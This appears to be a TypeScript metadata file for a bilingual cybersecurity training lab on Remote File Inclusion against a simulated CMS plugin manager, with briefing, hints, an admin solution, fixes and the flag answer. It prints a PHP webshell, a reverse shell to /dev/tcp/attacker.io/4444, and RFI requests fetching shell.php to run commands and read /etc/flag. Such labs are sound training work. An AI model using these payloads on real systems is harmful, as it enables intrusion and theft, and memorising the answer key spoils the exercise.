// src/modules/practice-labs/file-inclusion/labs/lab4/lab4.metadata.ts
import type { LabMetadata } from '../../../types/lab-metadata.type';

export const lfiLab4Metadata: LabMetadata = {
  slug: 'rfi-remote-file-inclusion-plugin-manager',
  title: 'File Inclusion: RFI — Remote Plugin Manager (allow_url_include)',
  ar_title: 'تضمين الملفات: RFI — مدير الإضافات عن بُعد (allow_url_include)',
  description:
    'Exploit a Remote File Inclusion vulnerability in a CMS plugin manager where allow_url_include is enabled. Load a remotely hosted malicious PHP file via HTTP URL to execute arbitrary code on the server — simulating a real-world RFI attack chain from file inclusion to full server takeover.',
  ar_description:
    'استغل ثغرة RFI في مدير إضافات CMS حيث allow_url_include مُفعَّل. حمّل ملف PHP خبيث مستضاف عن بُعد عبر HTTP URL لتنفيذ كود عشوائي على الخادم — محاكاة سلسلة هجوم RFI حقيقية من تضمين الملف إلى الاستيلاء الكامل على الخادم.',
  difficulty: 'ADVANCED',
  category: 'WEB_SECURITY',
  skills: [
    'Remote File Inclusion',
    'RFI',
    'allow_url_include',
    'Remote Code Execution',
    'Plugin Security',
  ],
  xpReward: 360,
  pointsReward: 180,
  duration: 60,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,

  // ─── للمتدرب ────────────────────────────────────────────────────
  goal: 'The plugin manager loads plugins via URL. Host a "malicious" PHP payload at the simulated attacker server (/attacker/payloads), then include it via the plugin URL parameter to execute code and read /etc/flag on the server.',
  ar_goal:
    'يحمّل مدير الإضافات الإضافات عبر URL. استضف حمولة PHP "خبيثة" في الخادم المحاكي للمهاجم (/attacker/payloads)، ثم أدرجها عبر معامل plugin URL لتنفيذ الكود وقراءة /etc/flag على الخادم.',

  briefing: {
    en: `PluginHub CMS. Install plugins by URL.
POST /plugins/install { "pluginUrl": "https://plugin-repo.io/seo-plugin.zip" }
Response: { "installed": true }
Legitimate use case. Admins install plugins from trusted URLs.
The backend: fetches the URL, executes the PHP.
Fetches. Executes. Any URL.
No domain whitelist. No content verification.
With allow_url_include=On in php.ini —
PHP will fetch and execute ANY remote PHP file.
You have a simulated attacker server.
GET /attacker/payloads → lists available malicious payloads.
shell.php: <?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>
reverse_shell.php: <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/attacker.io/4444 0>&1'"); ?>
POST /plugins/install { "pluginUrl": "http://attacker.io/shell.php?cmd=id" }
The server fetches http://attacker.io/shell.php
Executes it.
system("id") runs on the TARGET server.
uid=33(www-data) on their machine.
You never uploaded anything to their server.
The payload lives on YOUR server.
They executed it.`,
    ar: `PluginHub CMS. ثبّت إضافات بـ URL.
POST /plugins/install { "pluginUrl": "https://plugin-repo.io/seo-plugin.zip" }
الاستجابة: { "installed": true }
حالة استخدام شرعية. المسؤولون يثبّتون الإضافات من URLs موثوقة.
الـ backend: يجلب الـ URL، يُنفّذ PHP.
يجلب. يُنفّذ. أي URL.
بدون whitelist للنطاق. بدون تحقق من المحتوى.
مع allow_url_include=On في php.ini —
PHP ستجلب وتُنفّذ أي ملف PHP عن بعد.
لديك خادم مُحاكى للمهاجم.
GET /attacker/payloads → يعرض الحمولات الخبيثة المتاحة.
shell.php: <?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>
reverse_shell.php: <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/attacker.io/4444 0>&1'"); ?>
POST /plugins/install { "pluginUrl": "http://attacker.io/shell.php?cmd=id" }
الخادم يجلب http://attacker.io/shell.php
يُنفّذه.
system("id") يعمل على الخادم الهدف.
uid=33(www-data) على جهازهم.
لم ترفع أي شيء على خادمهم.
الحمولة موجودة على خادمك.
نفّذوها.`,
  },

  stepsOverview: {
    en: [
      'GET /attacker/payloads — enumerate available malicious PHP payloads on the simulated attacker server',
      'POST /plugins/install { "pluginUrl": "http://attacker.io/shell.php?cmd=whoami" } — confirm RFI execution',
      'Enumerate: { "pluginUrl": "http://attacker.io/shell.php?cmd=ls /etc/" } — list /etc/ directory',
      'Read flag: { "pluginUrl": "http://attacker.io/shell.php?cmd=cat /etc/flag" } → FLAG returned',
      'Bonus: use reverse_shell payload for a simulated interactive session',
    ],
    ar: [
      'GET /attacker/payloads — عدِّد الحمولات PHP الخبيثة المتاحة على الخادم المحاكي للمهاجم',
      'POST /plugins/install { "pluginUrl": "http://attacker.io/shell.php?cmd=whoami" } — أكّد تنفيذ RFI',
      'استعرض: { "pluginUrl": "http://attacker.io/shell.php?cmd=ls /etc/" } — اعرض مجلد /etc/',
      'اقرأ العلم: { "pluginUrl": "http://attacker.io/shell.php?cmd=cat /etc/flag" } → يُعاد العلم',
      'مكافأة: استخدم حمولة reverse_shell لجلسة تفاعلية محاكاة',
    ],
  },

  // ─── للأدمن فقط ─────────────────────────────────────────────────
  solution: {
    context:
      'PluginHub /plugins/install fetches and executes the remote URL as PHP: httpFetch(plugin_url) + executePhp(content). With allow_url_include=On and no URL domain filtering, any remote PHP file can be executed. The attacker server at attacker.io hosts shell.php and reverse_shell.php. The target server fetches and executes them — achieving full RCE without touching the target filesystem.',
    vulnerableCode:
      "// Plugin loader (vulnerable — RFI):\napp.get('/plugins/install', isAuthenticated, async (req, res) => {\n" +
      '  const { plugin_url } = req.query;\n' +
      '  // ❌ allow_url_include = On\n' +
      '  // ❌ Fetches and executes remote PHP file!\n' +
      '  const content = await httpFetch(plugin_url);\n' +
      '  executePhp(content); // Full RCE!\n' +
      '  res.json({ installed: true });\n' +
      '});',
    exploitation:
      '1. GET /attacker/payloads → lists available payloads\n' +
      '2. POST /plugins/install { "pluginUrl": "http://attacker.io/shell.php?cmd=id" } → "uid=33(www-data)"\n' +
      '3. POST /plugins/install { "pluginUrl": "http://attacker.io/shell.php?cmd=cat /etc/flag" } → FLAG',
    steps: {
      en: [
        'GET /attacker/payloads → [{ "name": "shell.php", "description": "Simple webshell" }, { "name": "reverse_shell.php" }]',
        'POST /plugins/install { "pluginUrl": "http://attacker.io/shell.php?cmd=id" } → { "output": "uid=33(www-data)" } — RCE confirmed',
        'POST /plugins/install { "pluginUrl": "http://attacker.io/shell.php?cmd=ls /etc/" } → lists /etc/ contents, see "flag" file',
        'POST /plugins/install { "pluginUrl": "http://attacker.io/shell.php?cmd=cat /etc/flag" } → FLAG{RFI_REMOTE_FILE_INCLUSION_PLUGIN_WEBSHELL_RCE}',
      ],
      ar: [
        'GET /attacker/payloads → [{ "name": "shell.php"، "description": "webshell بسيط" }، { "name": "reverse_shell.php" }]',
        'POST /plugins/install { "pluginUrl": "http://attacker.io/shell.php?cmd=id" } → { "output": "uid=33(www-data)" } — تأكيد RCE',
        'POST /plugins/install { "pluginUrl": "http://attacker.io/shell.php?cmd=ls /etc/" } → يعرض محتويات /etc/، يرى ملف "flag"',
        'POST /plugins/install { "pluginUrl": "http://attacker.io/shell.php?cmd=cat /etc/flag" } → FLAG{RFI_REMOTE_FILE_INCLUSION_PLUGIN_WEBSHELL_RCE}',
      ],
    },
    fix: [
      'Disable allow_url_include in php.ini: allow_url_include = Off — this completely prevents RFI',
      'Domain allowlist: only allow URLs from plugin-repo.io and trusted CDNs — reject all other domains',
      'Download and scan: download plugin, verify hash against known-good registry, sandbox-execute before installation',
      'Architecture change: implement a plugin marketplace with pre-vetted plugins — never execute arbitrary remote code',
    ],
  },

  postSolve: {
    explanation: {
      en: 'RFI is the most dangerous file inclusion variant because the attacker controls the payload without touching the target server. The php.ini setting allow_url_include=On enables PHP to fetch and execute remote URLs in include()/require() statements. This was common in older PHP applications (pre-2010) and is now off by default — but misconfigured servers still exist. Modern equivalents exist in other runtimes: Node.js eval(require(url)), Python exec(urllib.request.urlopen(url).read()), etc.',
      ar: 'RFI هو أخطر متغيرات تضمين الملفات لأن المهاجم يتحكم في الحمولة بدون لمس الخادم الهدف. إعداد php.ini allow_url_include=On يُتيح لـ PHP جلب وتنفيذ URLs عن بعد في عبارات include()/require(). كان هذا شائعاً في تطبيقات PHP القديمة (قبل 2010) وهو الآن مُعطَّل افتراضياً — لكن الخوادم المُهيَّأة بشكل خاطئ لا تزال موجودة. مكافئات حديثة موجودة في runtimes أخرى: Node.js eval(require(url))، Python exec(urllib.request.urlopen(url).read())، إلخ.',
    },
    impact: {
      en: '/etc/flag contains the root database password, admin API token, and the FLAG. With www-data RCE via RFI, the attacker achieves: full filesystem read access, ability to write files (webshell persistence, .htaccess backdoor), lateral movement to internal services via /etc/hosts, and potential privilege escalation if SUID binaries or misconfigured sudo are present.',
      ar: 'يحتوي /etc/flag على كلمة مرور قاعدة البيانات الجذر، رمز API المسؤول، والـ FLAG. مع www-data RCE عبر RFI، يحقق المهاجم: وصول كامل لقراءة نظام الملفات، القدرة على كتابة الملفات (persistence للـ webshell، .htaccess backdoor)، الحركة الجانبية للخدمات الداخلية عبر /etc/hosts، وإمكانية تصعيد الامتيازات إذا كانت SUID binaries أو sudo مُهيَّأة بشكل خاطئ.',
    },
    fix: [
      'php.ini: allow_url_include = Off (mandatory), allow_url_fopen = Off (recommended)',
      'Plugin architecture: curated marketplace with code review — no arbitrary URL execution',
      'If URL fetching is needed: download to temp file, run static analysis (YARA rules for PHP shells), sandbox execution',
      'Egress filtering: the server should not be able to make HTTP requests to arbitrary external IPs — only allowlisted plugin CDN domains',
    ],
  },

  hints: [
    {
      order: 1,
      xpCost: 25,
      content:
        'The plugin installer accepts a URL. With allow_url_include=On, PHP fetches AND EXECUTES remote files. Check GET /attacker/payloads to see what malicious PHP files are available on the simulated attacker server.',
    },
    {
      order: 2,
      xpCost: 45,
      content:
        'GET /attacker/payloads lists shell.php and reverse_shell.php. shell.php is a simple webshell: it executes whatever cmd= parameter you pass. Your server fetches and runs it on the target.',
    },
    {
      order: 3,
      xpCost: 70,
      content:
        'POST /plugins/install { "pluginUrl": "http://attacker.io/shell.php?cmd=whoami" }. The PluginHub server fetches shell.php from attacker.io and executes it — system("whoami") runs on THEIR server.',
    },
    {
      order: 4,
      xpCost: 100,
      content:
        'After confirming RCE with whoami, use cmd=cat /etc/flag to read the flag file. The entire /etc/flag content will be returned in the response.',
    },
  ],

  flagAnswer: 'FLAG{RFI_REMOTE_FILE_INCLUSION_PLUGIN_WEBSHELL_RCE}',
  initialState: {
    contents: [
      {
        title: 'ETC_FLAG',
        body: 'CMS_DB_ROOT_PASS=C0rp_DB_R00t_2024!\nADMIN_API_TOKEN=tok_live_pluginhub_secret_xyz\nFLAG=FLAG{RFI_REMOTE_FILE_INCLUSION_PLUGIN_WEBSHELL_RCE}',
        author: 'system_file',
        isPublic: false,
      },
    ],
  },
};
